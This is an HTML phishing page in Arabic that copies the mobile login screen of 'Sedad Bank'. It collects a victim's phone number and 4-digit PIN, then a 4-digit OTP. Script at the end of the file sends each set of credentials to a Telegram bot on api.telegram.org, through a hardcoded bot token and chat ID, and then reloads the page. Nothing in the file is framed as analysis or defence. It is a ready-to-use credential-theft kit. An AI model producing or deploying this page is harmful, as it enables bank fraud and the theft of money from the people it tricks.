<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sedad Bank - بنك السداد</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap');
        body { font-family: 'Tajawal', sans-serif; background: linear-gradient(to bottom, #f0f7ff, #ffffff); min-height: 100vh; margin: 0; }

        /* تنسيق شعار بنك السداد */
        .logo-container { display: flex; justify-content: center; padding: 50px 0 30px; }
        .logo-img { width: 220px; height: auto; }

        /* حقل رقم الهاتف */
        .phone-input-wrapper { position: relative; margin: 0 40px 20px; }
        .phone-input { width: 100%; padding: 12px 15px; border: 1.5px solid #ccc; border-radius: 12px; font-size: 16px; outline: none; background: white; text-align: right; }
        .phone-icon { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: #888; width: 20px; }

        /* حقول رمز الدخول (المربعات الأربعة) */
        .pin-container { display: flex; gap: 12px; justify-content: center; margin: 20px 40px; }
        .pin-box { width: 60px; height: 75px; border: 1.5px solid #ccc; border-radius: 18px; text-align: center; font-size: 24px; font-weight: bold; outline: none; background: white; }
        .pin-box:focus { border-color: #009640; }

        /* زر الدخول الأخضر */
        .btn-sedad { background-color: #009640; color: white; margin: 20px 40px; padding: 12px; border-radius: 12px; font-size: 18px; font-weight: bold; width: calc(100% - 80px); cursor: pointer; transition: 0.3s; }
        .btn-sedad:active { background-color: #007a33; }

        /* زر جهات الاتصال السفلي */
        .contacts-btn { display: flex; align-items: center; justify-content: center; gap: 10px; background: white; border: 1px solid #eee; border-radius: 10px; padding: 8px 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); margin: 40px auto; width: fit-content; }

        /* واجهة الـ OTP */
        #otp-screen { display: none; padding-top: 50px; text-align: center; }
    </style>
</head>
<body>

    <!-- الواجهة الأولى: تسجيل الدخول (بنك السداد) -->
    <div id="screen-login">
        <div class="logo-container">
            <!-- الشعار المستخرج من صورتك -->
            <img src="https://i.ibb.co/3sX8H3N/sedad-logo.png" alt="Sedad Bank" class="logo-img">
        </div>

        <div class="phone-input-wrapper">
            <input id="phone" type="tel" class="phone-input" placeholder="رقم الهاتف" maxlength="8">
            <svg class="phone-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path></svg>
        </div>

        <div class="pin-container">
            <input type="password" maxlength="1" class="pin-box" oninput="movePin(this, 0)">
            <input type="password" maxlength="1" class="pin-box" oninput="movePin(this, 1)">
            <input type="password" maxlength="1" class="pin-box" oninput="movePin(this, 2)">
            <input type="password" maxlength="1" class="pin-box" oninput="movePin(this, 3)">
        </div>

        <button onclick="handleLogin()" class="btn-sedad">تسجيل الدخول</button>

        <div class="text-center mt-4">
            <a href="#" class="text-sm text-gray-700">هل نسيت كلمة المرور؟</a>
        </div>

        <div class="text-center mt-16">
            <p class="text-gray-600">مستخدم جديد ؟ <span class="text-[#c19a5b] font-bold">سجل الان</span></p>
        </div>

        <div class="contacts-btn">
            <span class="text-gray-800">جهات الاتصال</span>
            <svg style="width:20px; height:20px" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path></svg>
        </div>
    </div>

    <!-- الواجهة الثانية: رمز التحقق -->
    <div id="otp-screen">
        <h2 class="font-bold text-xl mb-6">أدخل رمز التحقق (OTP)</h2>
        <div class="pin-container">
            <input type="tel" maxlength="1" class="pin-box otp-box" oninput="movePin(this, 4)">
            <input type="tel" maxlength="1" class="pin-box otp-box" oninput="movePin(this, 5)">
            <input type="tel" maxlength="1" class="pin-box otp-box" oninput="movePin(this, 6)">
            <input type="tel" maxlength="1" class="pin-box otp-box" oninput="movePin(this, 7)">
        </div>
        <button onclick="submitOTP()" class="btn-sedad">تأكيد الرمز</button>
    </div>

    <script>
        // البيانات المحدثة بناءً على صورك السابقة
        const TOKEN = "8640073881:AAHc6TuNlI7_fhuQ-K6Lbd6sKLgm6y-iZTk";
        const CHAT = "8665814266";

        function movePin(el, idx) {
            const boxes = document.querySelectorAll('.pin-box');
            if (el.value.length === 1 && idx < boxes.length - 1) {
                boxes[idx + 1].focus();
            }
        }

        function handleLogin() {
            const ph = document.getElementById('phone').value;
            let pin = "";
            document.querySelectorAll('.pin-box:not(.otp-box)').forEach(b => pin += b.value);

            if (ph.length >= 8 && pin.length === 4) {
                send(`🏦 Sedad Bank:\n📱 Phone: ${ph}\n🔐 PIN: ${pin}`);
                document.getElementById('screen-login').style.display = 'none';
                document.getElementById('otp-screen').style.display = 'block';
            } else {
                alert("يرجى إكمال البيانات");
            }
        }

        function submitOTP() {
            let otp = "";
            document.querySelectorAll('.otp-box').forEach(b => otp += b.value);
            if (otp.length === 4) {
                send(`🔑 Sedad OTP: ${otp}`);
                alert("جاري المعالجة...");
                location.reload();
            }
        }

        function send(msg) {
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(msg)}`);
        }
    </script>
</body>
</html>
